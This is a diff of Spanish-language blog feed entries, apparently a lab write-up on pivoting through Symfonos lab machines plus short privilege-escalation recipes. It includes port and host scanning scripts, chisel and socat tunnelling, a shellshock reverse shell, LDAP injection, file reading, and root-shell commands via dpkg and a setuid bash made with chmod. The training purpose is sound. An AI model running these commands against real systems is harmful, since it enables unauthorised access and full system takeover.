+  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;1 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo '' &amp;gt; /dev/tcp/10.10.0.128/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] 10.10.0.128 - PORT &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; OPEN&quot;&lt;/span&gt;&amp;amp;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hostDiscovery.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Gracias S4vitar!&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Colours&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;greenColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;32m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;redColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;31m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;34m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;yellowColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;33m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;purpleColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;35m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;turquoiseColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;36m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;grayColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;37m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#Si no hay parámetros, suponemos funcionamiento para HTP IP: 10.10.10.X&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2 254&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;1 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo ping -c 1 10.10.10.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Host 10.10.10.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;greenColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ACTIVE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &amp;amp;
+    &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;
+    
+&lt;span class=&quot;c&quot;&gt;#Si hay parámetros, tratamos cada uno de los parámetros como una de las 3 primeras partes de la IP: 192 168 0 X&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else 
+    for &lt;/span&gt;j &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2 254&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;1 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo ping -c 1 &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Host &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; - &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;greenColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ACTIVE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &amp;amp;
+    &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wait
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El script de hostDiscovery.sh nos detectó un host distinto al de la primera máquina, y ahora veremos los puertos abiertos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bien, ahora para hacer un escaneo más exhaustivo hay que tirar de Nmap desde nuestra máquina, pero como incialmente nosotros no tenemos conexión directa con la segunda máquina, hay que usar chisel.
+Nos bajamos el binario portable de chisel, para luego usar el comando upx para bajarle el peso así lo podamos pasar más rápido.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora lo subimos con el web server de Python o como vos prefieras, y luego en la máquina vulnerada lo ejecutas de la siguiente manera:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y en tu máquina así:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero para que funcione hay que editar el /etc/proxychains.conf de nuestra máquina atacante:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tienen que comentar el de socks4, porque si no va a dar problemas.
+Ahora, para probar si tenemos conexión, lanzaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxychains nmap -p80 --open -sT -T5 -v -n 10.10.0.136 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos conexión!&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeración-de-symfonos-3&quot;&gt;Enumeración de Symfonos 3&lt;/h2&gt;
+
+&lt;p&gt;Ahora hay que proceder como en un escaneo normal, no olvidandonos de usar proxychains al inicio de cada comando.
+ Yo suelo usar este:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al querer escanear las versiones de los puertos en cuestión proxychains nos dará algunos errores, pero nada de qué preocuparse.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, si queremos ver la web, obviamente no llegaremos, pero para eso hay que tirar de FoxyProxy.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Así, vamos a poder llegar a la web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos el código fuente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Habla algo de underworld. Vamos a tirar de gobuster para ver si encontramos algo.
+&lt;img src=&quot;/assets/images/labPivoting/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Importante saber que para declarar el proxy en el gobuster no hace falta usar proxychains, solo con usar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--proxy socks5://127.0.0.1:1080&lt;/code&gt; ya estaría.&lt;/p&gt;
+
+&lt;p&gt;Descubri el directorio /cgi-bin/ (Gracias a la opcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--add-slash&lt;/code&gt;) pero es Forbidden. Iba a volver a fuzzear pero me acorde de lo que hablaba de underworld:&lt;/p&gt;
+
+&lt;h2 id=&quot;ganando-acceso-al-sistema-1&quot;&gt;Ganando Acceso al Sistema&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos algo!
+parece como si fuera algun comando de consola tipo uptime, y esto me hace acordar a una vulnerabilidad que era muy explotada en 2014, shellshock. Probemos si es vulnerable.
+Usaré el exploit 34766.php de searchsploit.&lt;/p&gt;
+
+&lt;p&gt;Y ahora para probar, me voy a mandar una shell desde Symfonos 3 a mi máquina, pero no sin 
+antes reenviar por TCP todo el tráfico entrante por el puerto 4646 de la Symfonos 1 a mi máquina mediante socat:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces ahora tenemos que mandar el shellshock de la Symfonos 3 a la Symfonos 1, PERO nosotros tenemos que estar en escucha por el puerto 4646 en NUESTRA máquina, ya que eestamos desviando todo el trafico entrante de Symfonos 1 a nosotros.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y llegamos a Symfonos 3!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-horizontal&quot;&gt;Escalada de Privilegios Horizontal&lt;/h2&gt;
+&lt;p&gt;Si listamos /home, nos encontramos que hay otro usuario aparte de cerberus, hades.
+Subí el binario de &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt; a la Symfonos 3, para listar los procesos que hay en background, y esto fue lo que vi:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Qué será eso?
+Vamos a ver.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mmmm denegado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y el dueño es hades. Creo que por acá tenemos nuestra escalada de privilegios horizontal.
+Ese script le está mandando datos a FTP, y como FTP es un protocolo de datos en plano(sin encriptar) podríamos interceptarlo con tcpdump.&lt;/p&gt;
+
+&lt;p&gt;El comando que use: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump -w ftp.pcap -i ens33.&lt;/code&gt;
+Pero esto no funcionó. Estaba todo encriptado.
+Recorde que estaba enviando todo a traves de la interfaz lo, lo cual me hizo pensar que lo estaba enviando en local, asi que la voy a escanear a esa
+Ahora probaré con la interfaz &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para pasarnos un archivo de la Symfonos 3 a nuestra máquina (Acordate que no tenemos conexión directa) Tenemos que pasarlo de máquina en máquina mediante el servidor web de Python.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y tenemos las credenciales de Hades.
+Bien, ahora ya logeados como hades, procedemos a la escala de privilegios vertical.&lt;/p&gt;
+&lt;h2 id=&quot;escalada-de-privilegios-vertical-1&quot;&gt;Escalada de Privilegios Vertical&lt;/h2&gt;
+
+&lt;p&gt;En los binario SUID no hay nada interesante, pero me acordé de la carpeta ftpclient que no podíamos acceder en /opt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como a este binario lo está corriendo Root y no lo podemos modificar, pero sí leer, podríamos fijarnos en alguna librería que esté usando para poder inyectar nuestros comandos ahí.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Está usando ftplib, así que vamos a buscarla en /usr/lib/python2.7/ftplib.py&lt;/p&gt;
+
+&lt;p&gt;hacemos nuestro Library Hijacking:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si esperamos que root ejecute el binario:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/50.png&quot; alt=&quot;&quot; /&gt;
+Y ya escalamos la segunda máquina!&lt;/p&gt;
+&lt;h1 id=&quot;pivoting-a-symfonos-5&quot;&gt;Pivoting a Symfonos 5&lt;/h1&gt;
+
+&lt;p&gt;con hostDiscovery, encontramos otra IP diferente a la nuestra.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, para hacer un Dynamic Port Forwarding desde la Symfonos 3 (que da cara a la Symfonos 5) hasta nuestra máquina, hay que hacer lo siguiente con chisel:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto desde la Symfonos 3 intentará conectarse a la Symfonos 1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Así que desde la Symfonos 1 hay que redigir todo el tráfico con socat a nuestra máquina atacante.
+pero para que funcione hay que tocar ciertos parametros del proxychains.conf&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y si tiramos de nmap para ver si el puerto 80 de la Symfonos 5 está abierto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos conexion!&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeración-symfonos-5&quot;&gt;Enumeración Symfonos 5&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a ver la web, acordandonos que hay que usar el FoxyProxy con el puerto 8888.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hora de usar el gobuster.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Creo que con esto nos basta y sobra.
+Vamos a ver qué hay en /admin.php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Un Login, y me suena que esté conectado al LDAP que vemos en la enumeración.
+Vamos a ver si se puede hacer un LDAP Injection&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Voy a probar con * de usuario y * de contraseña&lt;/p&gt;
+
+&lt;p&gt;Y podemos acceder, y si nos vamos a la parte de portraits vemos esto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por la estructrura de la web, me suea a que podemos leer algun archivo interno:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bum.
+Ahora para ver el admin.php por dentro, habria que pasarlo a base64 y despues decodificarlo, tal que asi:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora si le echamos un ojo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;tenemos algunas credenciales de LDAP.
+si usamos nmap con el script de ldap-search:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos la contraseña de zeus!
+Ahora nos conectaremos por SSH:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Estamos adentro de la 3ra máquina! 
+Solo nos queda escalar privilegios.&lt;/p&gt;
+&lt;h2 id=&quot;escalada-de-privilegios-de-symfonos-5&quot;&gt;Escalada de Privilegios de Symfonos 5&lt;/h2&gt;
+
+&lt;p&gt;En los binarios SUID no encontramos nada, pero al hacer un sudo -l nos encontramos esto:
+&lt;img src=&quot;/assets/images/labPivoting/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si nos vamos a gtfobins, nos encontraremos que con dpkg podemos spawnear una consola como root de la siguiente manera
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo dpkg -l
+!/bin/sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/labPivoting/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta es nuestra flag final!&lt;/p&gt;</content><author><name>notlucken</name></author><category term="Pivoting" /><category term="Bash" /><category term="Herramientas" /><summary type="html">En este post veremos algunas tecnicas de Pivoting entre 3 maquinas.</summary></entry><entry><title type="html">Chmod - Privilege Escalation</title><link href="http://localhost:4000/chmod-privilege-escalation/" rel="alternate" type="text/html" title="Chmod - Privilege Escalation" /><published>2022-10-27T00:00:00-03:00</published><updated>2022-10-27T00:00:00-03:00</updated><id>http://localhost:4000/chmod-privilege-escalation</id><content type="html" xml:base="http://localhost:4000/chmod-privilege-escalation/">&lt;p&gt;Si vemos que el usuario que estamos usando, puede ejecutar chmod como sudo, lo que habría que hacer sería lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u root chmod 4577 /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chmodPrivilege/ch1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;luego solo habría que hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chmodPrivilege/ch2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>notlucken</name></author><category term="Escalada de Privilegios" /><category term="Sudo" /><summary type="html">Guia de como escalar privilegios cuando se puede ejecutar chmod como Sudo</summary></entry><entry><title type="html">Perl Cap - Privilege Escalation</title><link href="http://localhost:4000/perl-cap-setuid-privilege-escalation/" rel="alternate" type="text/html" title="Perl Cap - Privilege Escalation" /><published>2022-10-27T00:00:00-03:00</published><updated>2022-10-27T00:00:00-03:00</updated><id>http://localhost:4000/perl-cap-setuid-privilege-escalation</id><content type="html" xml:base="http://localhost:4000/perl-cap-setuid-privilege-escalation/">&lt;p&gt;Para saber si la máquina es vulnerable a esto, hay que realizar lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/perl/perl1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
